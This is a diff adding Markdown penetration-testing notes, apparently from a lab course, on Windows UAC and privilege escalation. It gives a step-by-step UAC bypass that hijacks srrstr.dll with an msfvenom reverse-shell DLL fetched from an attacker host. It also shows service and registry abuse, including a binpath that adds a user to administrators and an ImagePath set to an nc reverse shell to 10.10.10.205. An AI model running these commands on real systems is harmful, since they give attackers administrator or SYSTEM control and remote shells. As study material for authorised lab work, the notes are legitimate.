@@ -2057,3 +2057,338 @@ These are **Domain Controller secrets** → full domain compromise.
 
 ---
 
+# 📌 User Account Control (UAC)
+
+## 🔹 What is UAC?
+
+**User Account Control (UAC)** is a Windows feature that prompts users for consent when an action requires elevated (administrator) privileges.
+
+* Applications run with **standard user tokens** unless elevation is approved.
+* UAC is a **convenience and safety feature**, not a strict security boundary.
+* Helps reduce unintended system-level changes.
+
+## 🔹 Integrity Levels
+
+Windows assigns different integrity levels to processes:
+
+* **High** → Administrative tasks
+* **Medium** → Standard user
+* **Low** → Restricted (e.g., browser sandbox)
+
+The built-in **Administrator (RID 500)** always runs with a **high** integrity token.
+
+
+## 🔹 Admin Approval Mode (AAM)
+
+When AAM is enabled:
+
+* Admin accounts receive **two tokens** on login:
+
+  * Standard token (default)
+  * Elevated token (requires approval)
+* Applications normally run with the **standard token**.
+
+Example:
+
+```cmd
+whoami /user
+net localgroup administrators
+whoami /priv
+```
+
+
+## 🔹 Checking if UAC is Enabled
+
+### Check UAC global switch:
+
+```cmd
+REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+```
+
+* `0x1` → Enabled
+* `0x0` → Disabled
+
+### Check UAC prompt behavior:
+
+```cmd
+REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+```
+
+| Value | Meaning                           |
+| ----- | --------------------------------- |
+| 0x5   | Always notify (highest level)     |
+| 0x2   | Prompt for consent                |
+| 0x0   | Automatically elevate (dangerous) |
+
+
+## 🔹 10 UAC-Related Group Policy Options
+
+| Setting                                          | Registry Key                  | Default                                |
+| ------------------------------------------------ | ----------------------------- | -------------------------------------- |
+| Admin Approval Mode for built-in admin           | `FilterAdministratorToken`    | Disabled                               |
+| Allow UIAccess apps to bypass secure desktop     | `EnableUIADesktopToggle`      | Disabled                               |
+| Elevation prompt behavior (admins)               | `ConsentPromptBehaviorAdmin`  | Prompt                                 |
+| Elevation prompt behavior (standard users)       | `ConsentPromptBehaviorUser`   | Credentials on secure desktop          |
+| Detect application installations                 | `EnableInstallerDetection`    | Enabled (Home) / Disabled (Enterprise) |
+| Elevate only signed executables                  | `ValidateAdminCodeSignatures` | Disabled                               |
+| Elevate only UIAccess apps from secure locations | `EnableSecureUIAPaths`        | Enabled                                |
+| Run all admins in AAM                            | `EnableLUA`                   | Enabled                                |
+| Use secure desktop for prompt                    | `PromptOnSecureDesktop`       | Enabled                                |
+| Virtualize file/registry writes                  | `EnableVirtualization`        | Enabled                                |
+
+## 🔥 UAC Bypass
+
+### Target System Information
+
+* Windows Build: **14393 (Windows 10 1607)**
+* Supports UACMe Technique **#54**
+* Targets **SystemPropertiesAdvanced.exe (32-bit)**
+
+### Vulnerable Behavior
+
+* The 32-bit executable attempts to load:
+
+```
+srrstr.dll
+```
+
+from the DLL search order:
+
+1. Application directory
+2. System32
+3. Windows directory
+4. PATH directories (including user-writable folders)
+
+The user-writable location:
+
+```
+C:\Users\<user>\AppData\Local\Microsoft\WindowsApps
+```
+
+
+## 🛠️ Steps to Perform DLL Hijacking
+
+### 1. Generate a malicious DLL
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=8443 -f dll > srrstr.dll
+```
+
+### 2. Host the DLL
+
+```bash
+sudo python3 -m http.server 8080
+```
+
+### 3. Download DLL on target
+
+```powershell
+curl http://<attacker IP>:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
+```
+
+### 4. Start Netcat listener
+
+```bash
+nc -lvnp 8443
+```
+
+### 5. Test DLL execution (non-elevated)
+
+```cmd
+rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
+```
+
+You will get a **standard user reverse shell**.
+
+## 🧹 6. Kill all running rundll32 instances
+
+```cmd
+tasklist /svc | findstr "rundll32"
+taskkill /PID <PID> /F
+```
+
+## 🚀 7. Execute vulnerable auto-elevating binary
+
+```cmd
+C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+```
+
+Because DLL loading occurs before UAC prompt, the malicious DLL loads in a **high-integrity** context.
+
+
+## ✅ 8. Check Elevated Privileges on Reverse Shell
+
+```cmd
+whoami
+whoami /priv
+```
+
+Enabled privileges now include:
+
+* `SeDebugPrivilege`
+* `SeTakeOwnershipPrivilege`
+* `SeBackupPrivilege`
+* `SeRestorePrivilege`
+* `SeImpersonatePrivilege` (critical)
+* and others…
+
+This confirms the bypass succeeded, and you now have administrative privileges.
+
+---
+
+# 🛡️ Weak Permissions
+
+## Overview
+
+Windows permissions can be complex. Misconfigurations can allow privilege escalation, especially when involving services running as **SYSTEM**. As penetration testers, it's critical to understand how NTFS ACLs, service permissions, registry ACLs, and autoruns can be abused.
+
+## 🔍 1. Permissive File System ACLs
+
+### **Tool: SharpUp**
+
+* Checks for weak ACLs and modifiable service binaries.
+* Example finding:
+
+  * `PC Security Management Service` with modifiable binary at:
+    `C:\Program Files (x86)\PCProtect\SecurityService.exe`
+
+### **Manual Verification: icacls**
+
+```powershell
+icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+```
+
+* If **Users** or **Everyone** have **(F)** → full control → vulnerable.
+
+### **Exploitation**
+
+1. Backup the service executable.
+2. Replace with malicious payload (msfvenom, net user add, etc.).
+3. Start the service → payload runs as SYSTEM.
+
+## 🔧 2. Weak Service Permissions
+
+### **SharpUp Findings**
+
+* Identifies services where the **service configuration itself** is writable.
+* Example: `WindscribeService`
+
+### **Check Permissions: AccessChk**
+
+```powershell
+accesschk.exe -quvcw WindscribeService
+```
+
+* If `Authenticated Users` have `SERVICE_ALL_ACCESS` → full control.
+
+### **Exploit: Change service binary path**
+
+```powershell
+sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
+sc stop WindscribeService
+sc start WindscribeService
+```
+
+* Service fails to start but command executes → privilege escalation.
+
+### **Cleanup**
+
+```powershell
+sc config WindScribeService binpath="C:\Program Files (x86)\Windscribe\WindscribeService.exe"
+sc start WindScribeService
+```
+
+## 📁 3. Unquoted Service Paths
+
+### **Concept**
+
+Unquoted service paths can lead to execution of unintended binaries.
+
+Example unquoted path:
+
+```
+C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
+```
+
+Windows tries in order:
+
+1. `C:\Program.exe`
+2. `C:\Program Files.exe`
+3. `C:\Program Files (x86)\System.exe`
+4. Actual binary
+
+### **Conditions for exploitation**
+
+* Ability to create files in `C:\` or `Program Files` (rare).
+* Ability to restart the service (sometimes impossible).
+
+### **Finding unquoted paths**
+
+```powershell
+wmic service get name,displayname,pathname,startmode ^
+ | findstr /i "auto" ^
+ | findstr /i /v "c:\windows\\" ^
+ | findstr /i /v """
+```
+
+## 🗝️ 4. Permissive Registry ACLs
+
+Service configurations live in:
+
+```
+HKLM\SYSTEM\CurrentControlSet\Services
+```
+
+### **Check registry ACLs**
+
+```powershell
+accesschk.exe "user" -kvuqsw hklm\System\CurrentControlSet\Services
+```
+
+If a service key shows **KEY_ALL_ACCESS**, a user can modify `ImagePath`.
+
+### **Exploit: change ImagePath**
+
+```powershell
+Set-ItemProperty `
+  -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService `
+  -Name ImagePath `
+  -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
+```
+
+Service restart → code execution as service user (often SYSTEM).
+
+## 🔄 5. Modifiable Registry Autoruns
+
+Programs that run at startup are stored in various Run keys.
+
+### **Enumerate Autoruns**
+
+```powershell
+Get-CimInstance Win32_StartupCommand | select Name, Command, Location, User
+```
+
+### **If:**
+
+* Autorun binary is writable
+  **OR**
+* Autorun registry key is writable
+
+→ privilege escalation on next user login (persistence or escalation depending on user).
+
+### **Common autorun locations**
+
+* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+* `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
+* `HKLM\SYSTEM\CurrentControlSet\Services` (service autoruns)
+* Startup folder:
+
+  * `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
+  * `C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
+
+(Full lists documented on Microsoft docs & malware analysis sites.)
+
+---
+
+
